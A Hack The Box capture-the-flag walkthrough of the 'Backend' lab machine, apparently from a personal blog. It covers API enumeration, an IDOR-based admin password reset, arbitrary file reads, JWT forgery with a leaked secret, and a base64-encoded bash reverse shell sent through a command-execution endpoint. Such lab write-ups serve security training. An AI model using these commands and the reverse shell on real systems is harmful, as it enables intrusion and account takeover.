---
title: "Backend Walkthrough(Hack The Box)"
date: 2025-03-10
draft: false
description: "A straight walthrough of Backend Box"
tags: ["Medium", "Linux", "Hack The Box", "hacking", "walkthrough", "web"]
 
---
## Reconnaissance & Enumeration
- Nmap scan results:
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    Uvicorn
|_http-title: Site doesn't have a title (application/json).
| http-methods: 
|_  Supported Methods: GET
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Uptime guess: 17.734 days (since Sun Feb 16 04:30:26 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   265.74 ms 10.10.14.1
2   265.82 ms 10.10.11.161

```
- After hours of fuzzing I found multiple endpoints, where by simply playing with endpoints in burp we can reveal more.
- But one in particular `/docs` asks for authentication cookie. We can also do directory fuzzing in recursive mode with any tool but I personally found the endpoints just by guessing them.
- There is one signup endpoint which is `api/v1/user/signup`. Using this endpoint I can create an account.
- After enumerating further on that endpoint I found all the data parameters of it. Now I can create an account using this

```bash
curl -v -X POST 'http://10.10.11.161/api/v1/user/signup' -H 'Content-Type: application/json' -d '{"email":"Emp5r0R@king.com", "password":"password"}'  | jq
```
- ![signup](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250305235914.png?raw=true)
- Eventually I found another endpoint which is `/login`. But initially it was showing error on sending the json data but it turns out this endpoint only accept HTML data. I curled the endpoint

```
curl -v 'http://10.10.11.161/api/v1/user/login'  -d 'username=Emp5r0R@king.com&password=password' | jq .
```
- In return I got the JWT token ![token-gif](https://media.giphy.com/media/PxVKRFBpfx6JUlBoc3/giphy.gif?cid=790b76110zjv3n4kxnxi7vbwtnqzxnac71n8ixnapykh1iec&ep=v1_gifs_search&rid=giphy.gif&ct=g)
- Curl Output:
![login-output](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306000008.png?raw=true)

- I used this [extension](https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/) to modify the header, I could've used burp interceptor but for some reason it didn't worked for me as intended.
![Alt](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306000151.png?raw=true)

- I tried to access `/docs` endpoint with providing the token, After including it, I was redirected to `FastAPI` interface. 
![FastAPI](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306000101.png?raw=true)

- Surpisingly,`SecretFlagEndpoint` straight out gave {{< keyword >}} User flag {{< /keyword >}} 
- I didn't expect this 
![User_flag](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306000302.png?raw=true)
- After some enumeration I found this endpoint `/api/v1/user/0` which on modifying the Id parameter spits out user information. This Id `1` gave me the admin details.

```bash
curl -X 'GET' \
  'http://10.10.11.161/api/v1/user/1' \
  -H 'accept: application/json' | jq
```
![Admin_details](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306084525.png?raw=true)

- I can change password of any user If I had `guid`, As I already have the `guid` of user `admin` I can change `admin` account's password by curling this endpoint `/api/v1/user/updatepass` with valid data.
```bash
curl -X 'POST' \
  'http://10.10.11.161/api/v1/user/updatepass' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "password": "emperor"
}'
```
![updatepass](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306084838.png?raw=true)

- Using the newly changed password I authorized myself with `FastAPI`

![fastapi-auth](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306084936.png?raw=true)

- Now I can access admin endpoints as I am an admin now to FastAPI
![admin_endpoints](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306085052.png?raw=true)

- Here the endpoint `file` seems to be useful, actually I can read arbitary files using this endpoint. First let me try and access `/etc/passwd`

```bash
curl -X 'POST' \
  'http://10.10.11.161/api/v1/admin/file' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE' \
  -H 'Content-Type: application/json' \
  -d '{
  "file": "/etc/passwd"
}' | jq
```
- It was successfull
![gif](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExaTUxcXV2bW1yYmZxOTVob3g5d2JsdTFqa2JuM201bmpzMHh2bTZ3dyZlcD12MV9naWZzX3NlYXJjaCZjdD1n/fyHMkzt0iee7vnGJZc/giphy.gif)
![passwd](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306085318.png?raw=true)
 
- However when I try to run commands using this endpoint `/api/v1/admin/exec/<commands>` I get this error. Hmm... what could it be 🤔
![error](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306085608.png?raw=true)

- From `/etc/passwd` I got to know that user `htb` has `bash` access.
![user-htb](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306085831.png?raw=true)

## Exploitation
- To identify the web application running directory I can request to read this file path `/proc/self/environ`. From reading the file I identified the running directory of this web.
```bash
curl -X 'POST' \  
  'http://10.10.11.161/api/v1/admin/file' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE' \
  -H 'Content-Type: application/json' \
  -d '{
  "file": "/proc/self/environ"
}' | jq -r '.file'
``` 
![env-iden](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306090839.png?raw=true)

- The path should be this `/home/htb/uhc/app/main.py`
- I requested for the source code using `file` endpoint and got it 
```python
import asyncio

from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.openapi.docs import get_swagger_ui_html
from fastapi.openapi.utils import get_openapi



from typing import Optional, Any
from pathlib import Path
from sqlalchemy.orm import Session



from app.schemas.user import User
from app.api.v1.api import api_router
from app.core.config import settings

from app import deps
from app import crud


app = FastAPI(title="UHC API Quals", openapi_url=None, docs_url=None, redoc_url=None)
root_router = APIRouter(default_response_class=UJSONResponse)


@app.get("/", status_code=200)
def root():
    """
    Root GET
    """
    return {"msg": "UHC API Version 1.0"}


@app.get("/api", status_code=200)
def list_versions():
    """
    Versions
    """
    return {"endpoints":["v1"]}


@app.get("/api/v1", status_code=200)
def list_endpoints_v1():
    """
    Version 1 Endpoints
    """
    return {"endpoints":["user", "admin"]}


@app.get("/docs")
async def get_documentation(
    current_user: User = Depends(deps.parse_token)
    ):
    return get_swagger_ui_html(openapi_url="/openapi.json", title="docs")

@app.get("/openapi.json")
async def openapi(
    current_user: User = Depends(deps.parse_token)
):
    return get_openapi(title = "FastAPI", version="0.1.0", routes=app.routes)

app.include_router(api_router, prefix=settings.API_V1_STR)
app.include_router(root_router)

def start():
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8001, log_level="debug")

if __name__ == "__main__":
    # Use this for debugging purposes only
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8001, log_level="debug")

```
- This is just a basic code let's analyze other files. From the import headers I can learn about other file locations.
```python
from app.schemas.user import User
from app.api.v1.api import api_router
from app.core.config import settings
```
- On requesting`/app/core/config.py` I got the jwt secret
```python
from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

from enum import Enum


class Settings(BaseSettings):
    API_V1_STR: str = "/api/v1"
    JWT_SECRET: str = "SuperSecretSigningKey-Hack The Box"
    ALGORITHM: str = "HS256"

    # 60 minutes * 24 hours * 8 days = 8 days
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8

    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins
    # e.g: '["http://localhost", "http://localhost:4200", "http://localhost:3000", \
    # "http://localhost:8080", "http://local.dockertoolbox.tiangolo.com"]'
    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []

    @validator("BACKEND_CORS_ORIGINS", pre=True)
    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:
        if isinstance(v, str) and not v.startswith("["):
            return [i.strip() for i in v.split(",")]
        elif isinstance(v, (list, str)):
            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///uhc.db"
    FIRST_SUPERUSER: EmailStr = "root@ippsec.rocks"    

    class Config:
        case_sensitive = True
 

settings = Settings()
```
- **Forging JWT Token**
	- Earlier while trying to access `/execute/<Command>` I got missing `debug` key error
	- I can forge a JWT with debug option included.
	- On working on this I got error because Of time skew between the target(JWT Token) and my system is too high. So I made this program to display the time stamp from the token
```python

import jwt
import time
import datetime

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE"

decoded_payload = jwt.decode(token, options={"verify_signature": False})
print(decoded_payload)
iat_timestamp = decoded_payload['iat']

current_time_timestamp = int(time.time())

print(f"iat timestamp: {iat_timestamp}")
print(f"current time timestamp: {current_time_timestamp}")

print(f"iat datetime: {datetime.datetime.fromtimestamp(iat_timestamp)}")
print(f"current datetime: {datetime.datetime.fromtimestamp(current_time_timestamp)}")
```
- This was the output, As we can see the time skew is 3 hours(approx).
![Pasted image 20250306101600.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306101600.png?raw=true)
- So I made the code to adapt to the time and forged jwt token
```python
import jwt
import datetime

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE"
secret = "SuperSecretSigningKey-Hack The Box"

leeway = datetime.timedelta(hours=3)
decoder = jwt.decode(token, secret, ["HS256"], leeway=leeway)
print(decoder)

decoder["debug"] = True # Adding debug option.

encoded_token = jwt.encode(decoder, secret, algorithm="HS256") #encode the dictionary.
print(f"Encoded token: {encoded_token}")
```
- Got the token
![Pasted image 20250306101747.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306101747.png?raw=true)

- Using the token, I executed some commands via `/api/admin/exec/<command>` and It worked 
```bash
curl -v -X 'GET' \
  'http://10.10.11.161/api/v1/admin/exec/pwd' \     
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.yWQeRZjjOrROK-XosRoR8lMf52e3YxNtX4bhj3haUBw'
```
![Pasted image 20250306101847.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306101847.png?raw=true)

- **Getting reverse shell**
    > Encoded bash reverse shell payload into base64.
```bash
echo 'bash -c "exec bash -i &>/dev/tcp/10.10.14.10/6001 <&1"' | base64
```
![Pasted image 20250306102426.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306102426.png?raw=true)

- Then created this payload, here `%20` represents white space in URL encoded form.
- The raw command here is `echo <Base64-encoded-payload> | base64 -d | bash`
- Final payload for reverse shell:
```bash
curl -s  \                                                                  
  'http://10.10.11.161/api/v1/admin/exec/echo%20YmFzaCAtYyAiZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTAvNjAwMSA8JjEiCg==%20|%20base64%20-d%20|%20bash' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.yWQeRZjjOrROK-XosRoR8lMf52e3YxNtX4bhj3haUBw'
```
- Opened a netcat listener on my system (`nc -lnvp 6001`) and got the shell connection, then I upgraded the shell
![shell](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306102824.png?raw=true)

## Privilege Escalation
- Found a file called `uhc.db`
![Pasted image 20250306103655.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306103655.png?raw=true)
- It had password hash for my accounts and for other but nothing useful
- There was another interesting file named `auth.log`. Which had admin logon logs, Also it had a string which seemed out of place. 
![Pasted image 20250306104006.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306104006.png?raw=true)
- Actually that was the password for root user.
![surpise](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExb2ttNzBvam9vam4ybXkwNWUyeXV2bjZicnExcTQwZ3EycmU2Zjl2eiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/o54Wuz7HIrjARFJWzA/giphy.gif)
- Got the {{< keyword >}} Root flag {{< /keyword >}} 
![Pasted image 20250306104131.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250306104131.png?raw=true)

{{< typeit >}} oh oh, you have reached the end, mate. Don't worry you can check out my other posts from this series(Only if you are interested😜, Not like I can force you anyway). Ok, until next time..... {{< /typeit >}}

![goodBye](https://media.giphy.com/media/Jgr5AJ4hmeEs7AgNBT/giphy.gif?cid=790b7611h8f0zgfr6ejawj4d02d6txjcp5y5ubskmyexuh54&ep=v1_gifs_search&rid=giphy.gif&ct=g)


